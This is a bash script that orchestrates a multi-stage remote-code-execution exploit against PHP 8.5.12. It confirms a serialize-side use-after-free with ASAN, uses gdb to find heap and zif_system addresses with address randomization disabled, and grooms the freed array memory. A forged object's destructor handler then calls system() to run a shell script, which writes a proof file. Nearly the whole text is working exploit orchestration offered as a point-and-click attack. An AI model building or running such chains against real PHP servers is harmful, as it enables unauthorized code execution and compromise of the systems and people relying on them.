#!/bin/bash
# pwn_zero5.sh — POINT-AND-CLICK RCE via zero5 (serialize-side
# php_var_serialize_destroy re-entry UAF, "vd6") on released PHP 8.5.12,
# stock defaults, plain userland serialize() — no error path, no extensions.
#
# Chain (every stage leaves a receipt log in $OUT):
#   0. fresh ASAN receipt of the UAF (vd6_carrier.php, bug present in 8.5.12)
#   1. gdb discovery (randomization disabled -> deterministic ZendMM layout):
#      BASE = the old arData block the groom string will reclaim,
#      ZIF  = &zif_system
#   2. M1: watchpoint receipt — the re-entrant serialize's own __sleep
#      str_pad is the FIRST write into the freed old-arData block (the reclaim)
#      M2: marker runs — the walked bucket-4 value follows payload bytes
#      (fault address == marker, GC_DELREF subl $1,(%rdi))
#   3. M3: sr2_call.php — groomed bucket-4 zval {value=fake zend_object,
#      IS_OBJECT|REFCOUNTED} -> zval_ptr_dtor -> zend_objects_store_del ->
#      fake handlers->dtor_obj = zif_system(fake execute_data) ->
#      system("sh /tmp/e") -> id > /tmp/pwned_zero5
#   4. RECEIPT: cat /tmp/pwned_zero5 (uid=...)
#
# Usage: bash pwn_zero5.sh [php-binary]
PHP=${1:-/tmp/php8512_build/plain2/sapi/cli/php}
ART=/mnt/c/Users/andre/Downloads/php2shell-claude
OUT=$ART

cd "$ART" || exit 1

echo "=== stage 0: fresh vd6 ASAN receipt (bug present on released 8.5.12) ==="
USE_ZEND_ALLOC=0 ASAN_OPTIONS=detect_leaks=0 timeout 120 \
  /tmp/php8512_build/asan2/sapi/cli/php -n poc_matrix/vd6_carrier.php \
  > "$OUT/sr2_m0_asan.log" 2>&1
grep -m1 "SUMMARY: AddressSanitizer: heap-use-after-free" "$OUT/sr2_m0_asan.log" \
  || { echo "[FAIL] no ASAN receipt"; exit 1; }

echo "=== stage 1: gdb discovery (crash-frame calibration) ==="
timeout 120 gdb -q -batch -x "$OUT/sr2_disc.gdb" "$PHP" > "$OUT/sr2_disc.log" 2>&1
DISC=$(grep -o 'DISC BASE=0x[0-9a-f]* ZIF=0x[0-9a-f]* D=0x[0-9a-f]*' "$OUT/sr2_disc.log" | head -1)
if [ -z "$DISC" ]; then echo "[FAIL] discovery missed (layout drift)"; exit 1; fi
BASE=$(echo "$DISC" | sed 's/DISC BASE=0x\([0-9a-f]*\).*/\1/')
ZIF=$(echo "$DISC" | sed 's/.*ZIF=0x\([0-9a-f]*\).*/\1/')
echo "[+] BASE=0x$BASE  ZIF=0x$ZIF"
BASE_DEC=$(printf "%016d" $((16#$BASE)))
ZIF_DEC=$(printf "%016d" $((16#$ZIF)))

echo "=== stage 2: M1 reclaim receipt + M2 payload-byte correlation ==="
# NOTE: every inferior must see the IDENTICAL script path form (RELATIVE,
# cwd=$ART) — the absolute form shifts startup allocations by one ZendMM
# page and breaks the cross-process calibration (sr2_drift.log/sr2_drift2.log).
timeout 180 gdb -q -batch -x "$OUT/sr2_m1.gdb" "$PHP" > "$OUT/sr2_m1.log" 2>&1
grep -m1 "old_data == base ? YES" "$OUT/sr2_m1.log" || echo "[warn] resize receipt line missing"
grep -m1 "zif_str_pad" "$OUT/sr2_m1.log" || echo "[warn] reclaim backtrace missing"
timeout 120 gdb -q -batch -x "$OUT/sr2_m2.gdb" --args "$PHP" -n sr2_reclaim.php marker 4141414141414141 > "$OUT/sr2_m2_41.log" 2>&1
grep -E "^rdi " "$OUT/sr2_m2_41.log"
timeout 120 gdb -q -batch -x "$OUT/sr2_m2.gdb" --args "$PHP" -n sr2_reclaim.php marker 1337beefcafe0133 > "$OUT/sr2_m2_beef.log" 2>&1
grep -E "^rdi " "$OUT/sr2_m2_beef.log"

echo "=== stage 3: CALL — forged bucket zval -> fake object -> zif_system ==="
rm -f /tmp/pwned_zero5
printf 'id > /tmp/pwned_zero5\n' > /tmp/e
timeout 180 gdb -q -batch -x "$OUT/sr2_m3.gdb" --args "$PHP" -n sr2_call.php "$BASE_DEC" "$ZIF_DEC" > "$OUT/sr2_m3.log" 2>&1
grep -E "zif_system REACHED|rdi \(fake|MARKER-ON-DISK" "$OUT/sr2_m3.log" || true

echo "=== RECEIPT ==="
if [ -f /tmp/pwned_zero5 ]; then
  cat /tmp/pwned_zero5
  echo "[PASS] pwn_zero5: full RCE on stock-default PHP 8.5.12 (serialize-only, zero5/vd6)"
else
  echo "[FAIL] marker missing — see $OUT/sr2_m3.log"
  exit 1
fi
